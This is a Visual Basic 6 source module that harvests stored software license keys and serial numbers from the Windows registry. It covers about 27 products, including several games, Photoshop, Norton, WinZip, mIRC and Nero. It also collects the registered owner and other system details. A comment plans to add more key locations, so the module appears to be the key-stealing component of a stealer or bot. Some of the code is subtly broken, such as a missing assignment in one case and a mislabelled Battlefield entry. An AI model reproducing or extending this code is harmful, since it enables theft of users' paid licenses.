Attribute VB_Name = "Module11"
Declare Function RegCloseKey& Lib "advapi32.dll" (ByVal hKey&)
Declare Function RegOpenKeyExA& Lib "advapi32.dll" (ByVal hKey&, ByVal lpszSubKey$, dwOptions&, ByVal samDesired&, lpHKey&)
Declare Function RegQueryValueExA& Lib "advapi32.dll" (ByVal hKey&, ByVal lpszValueName$, ByVal lpdwRes&, lpdwType&, ByVal lpDataBuff$, nSize&)
Declare Function RegQueryValueEx& Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey&, ByVal lpszValueName$, ByVal lpdwRes&, lpdwType&, lpDataBuff&, nSize&)
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const ERROR_SUCCESS = 0&
Const REG_SZ = 1&
Const REG_DWORD = 4&
Const KY_QUERY_VALUE = &H1&
Const KY_SET_VALUE = &H2&
Const KY_CREATE_SUB_KY = &H4&
Const KY_ENUMERATE_SUB_KEYS = &H8&
Const KY_NOTIFY = &H10&
Const KY_CREATE_LINK = &H20&
Const READ_CONTROL = &H20000
Const WRITE_DAC = &H40000
Const WRITE_OWNER = &H80000
Const SYNCHRONIZE = &H100000
Const STANDARD_RIGHTS_REQUIRED = &HF0000
Const STANDARD_RIGHTS_READ = READ_CONTROL
Const STANDARD_RIGHTS_WRITE = READ_CONTROL
Const STANDARD_RIGHTS_EXECUTE = READ_CONTROL
Const KY_READ = STANDARD_RIGHTS_READ Or KY_QUERY_VALUE Or KY_ENUMERATE_SUB_KEYS Or KY_NOTIFY
Const KY_WRITE = STANDARD_RIGHTS_WRITE Or KY_SET_VALUE Or KY_CREATE_SUB_KY
Const KY_EXECUTE = KY_READ
Public Function SKEYZ(ID As Integer) ' Need to add more CD Key locations once I get a list.
Select Case ID
Case 1
SKEYZ = "Product ID: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductId")
Case 2
SKEYZ = "Product Key: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductKey")
Case 3
SKEYZ = "Product Name: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductName")
Case 4
SKEYZ = "Program File Dir: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProgramFilesDir")
Case 5
SKEYZ = "Registered Orginization: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "RegisteredOrganization")
Case 6
SKEYZ = "Registered Owner: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "RegisteredOwner")
Case 7
SKEYZ = "System R00T: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "SystemRoot")
Case 8
SKEYZ = "Current Version: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "Version")
Case 9
SKEYZ = "Version Number: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "VersionNumber")
Case 10
SKEYZ = "Decive Path: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "DevicePath")
Case 11
SKEYZ = "Config Path: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ConfigPath")
Case 12
SKEYZ = "Common File Dir: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "CommonFilesDir")
Case 13
SKEYZ = "Media Path: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "MediaPath")
Case 14
SKEYZ = "Other Device Path: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "OtherDevicePath")
End Select

End Function
  
Public Function SKEYS(ID As Integer) ' Need to add more CD Key locations once I get a list.
 Select Case ID
 Case 1
  SKEYS = "Windows: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", "ProductId")
 Case 2
  SKEYS = "Half-Life: " & RegGetValue(HKEY_CURRENT_USER, "Software\Valve\Half-Life\Settings", "KY")
 Case 3
  SKEYS = "Counter-Strike: " & RegGetValue(HKEY_CURRENT_USER, "Software\Valve\CounterStrike\Settings", "KY")
 Case 4
  SKEYS = "Battlefield 2: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Electronic Arts\EA GAMES\Battlefield 1942", "ergc")
 Case 5
  SKEYS = "U2K3: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Unreal Technology\Installed Apps\UT2003", "CDKey")
 Case 6
  SKEYS = "Project IGI2: " & RegGetValue(HKEY_LOCAL_MACHINE, "IGI 2 Retail", "CDKey")
 Case 7
  SKEYS = "Rainbow Six: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Red Storm Entertainment\RAVENSHIELD", "CDKey")
  Case 8
  SKEYS = "Norton: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\Symantec\Shared Technology\Volatile Storage\Member Profile\Product\07-05-00335", "SerialNum")
Case 9
SKEYS "Photoshop 7.0: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\Adobe\Photoshop\7.0\Registration", "SERIAL")
Case 10
SKEYS = "mIRC License: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\mIRC\License", "")
Case 11
SKEYS = "mIRCname: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\mIRC\UserName", "")
Case 12
SKEYS = "WinZip: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\Nico Mak Computing\WinZip\WinIni", "SN")
Case 13
SKEYS = "Winzip Name: " & RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\Nico Mak Computing\WinZip\WinIni", "Name")
Case 14
SKEYS = "UltraDev4 :" & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Macromedia\UltraDev\4\Registration", "Serial Number")
Case 15
SKEYS = "Nero 5: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Ahead\Nero - Burning ROM\Info", "Serial5")
Case 16
SKEYS = "ULead Photo Impact: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Ulead Systems\Ulead PhotoImpact\7.0\installer", "Serial Number")
Case 17
SKEYS = "Unreal Tournament: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Unreal Technology\Installed Apps\UT2003", "CDKey")
Case 18
SKEYS = "IGI 2: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\IGI 2 Retail", "CDKey")
Case 19
SKEYS = "Ravensheild: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Red Storm Entertainment\RAVENSHIELD", "CDKey")
Case 20
SKEYS = "The Gladiators: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Eugen Systems\The Gladiators", "RegNumber")
Case 21
SKEYS = "Tibsun Sun: " & RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Westwood\Tiberian Sun", "Serial")
Case 22
SKEYS = "Battlefeild 1942: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Electronic Arts\EA GAMES\Battlefield 1942", "ergc")
Case 23
SKEYS = "Battlefeild 1942 RTR: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Electronic Arts\EA GAMES\Battlefield 1942 The Road to Rome", "ergc")
Case 24
SKEYS = "COD1: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Activision\Call of Duty", "codkey")
Case 25
SKEYS = "COD2: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Activision\Call of Duty 2", "codkey")
Case 26
SKEYS = "COD3: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Activision\Call of Duty 3", "codkey")
Case 27
SKEYS = "COD4: " & RegGetValue(HKEY_LOCAL_MACHINE, "Software\Activision\Call of Duty 4", "codkey")
 End Select
End Function
Function RegGetValue$(MainKey&, SubKey$, value$)
   Dim sKeyType&
   Dim ret&
   Dim lpHKey&
   Dim lpcbData&
   Dim ReturnedString$
   Dim ReturnedLong&
   If MainKey >= &H80000000 And MainKey <= &H80000006 Then
      ret = RegOpenKeyExA(MainKey, SubKey, 0&, KY_READ, lpHKey)
      If ret <> ERROR_SUCCESS Then
         RegGetValue = "No Key"
         Exit Function
      End If
      lpcbData = 255
      ReturnedString = Space$(lpcbData)
      ret& = RegQueryValueExA(lpHKey, value, ByVal 0&, sKeyType, ReturnedString, lpcbData)
      If ret <> ERROR_SUCCESS Then
         RegGetValue = "No Key"
      Else
        If sKeyType = REG_DWORD Then
            ret = RegQueryValueEx(lpHKey, value, ByVal 0&, sKeyType, ReturnedLong, 4)
            If ret = ERROR_SUCCESS Then RegGetValue = CStr(ReturnedLong)
        Else
            RegGetValue = Left$(ReturnedString, lpcbData - 1)
        End If
    End If
      ret = RegCloseKey(lpHKey)
   End If
End Function



